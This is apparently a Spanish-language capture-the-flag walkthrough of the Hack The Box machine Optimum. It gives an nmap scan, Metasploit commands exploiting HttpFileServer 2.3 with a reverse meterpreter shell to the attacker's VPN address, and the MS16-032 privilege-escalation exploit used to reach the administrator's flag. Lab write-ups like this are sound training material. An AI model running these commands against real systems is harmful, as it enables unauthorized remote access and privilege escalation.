- Maquina: Windows
- Level: Easy
- IP: 10.10.10.8

## Herramientas a utilizar:

- nmap
- searchspoit 
- msfconsole


```
nmap -sC -sV -n -o scan_optimum.txt 10.10.10.8
```
>En el resultado de nmap veremos:

|PORT   | STATE | SERVICE | VERSION |
|-------|-------|---------|---------|
|80/tcp | open  |  http   | HttpFileServer httpd 2.3|

>Para tener shell con metaexploit
```
msfconsole
```
```
search rejetto
```
```
use exploit/windows/http/rejetto_hfs_exec
```
```
set RHOST 10.10.10.8
set RPORT 80
set SRVHOST 10.10.14.15 {la direccion ip vpn_htb}
set SRVPORT 60001
set PAYLOAD windows/x64/meterpreter/reverse_tcp`
set LHOST 10.10.14.15 {la direccion ip vpn_htb}
set lport 60001
exploit
```

> Una vez tengamos la session creada de metaexploit haremos lo siguiente para escalar privilegio

Crtl+Z 
y (esto es para volver a metaexploit y dejamos en backgroup la session 1)

```
search suggest
use 4  {post/multi/recon/local_exploit_suggester}
set session 1
run
```

> Como no funciono, nos iremos por otra via.
```
session -i 1
ps
```
`migrate 2088` este es el `pid{2088}` del proceso de `C:\windows\explorer.exe`,  puede variar)

Volvermos a verificar si ya tenemos un meterpreter en x64
`systeminfo`
Crtl+Z 
y (esto es para volver a metaexploit y dejamos en backgroup la session 1)
`run`

>Como no logramos tener exito probaremos con el siguiente exploit
```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set session 1
options
set lhost 10.10.14.15
run
```
>Listo solo tenemos que ir a C:\users\administrator\Desktop
`cat root.txt Done!!!
`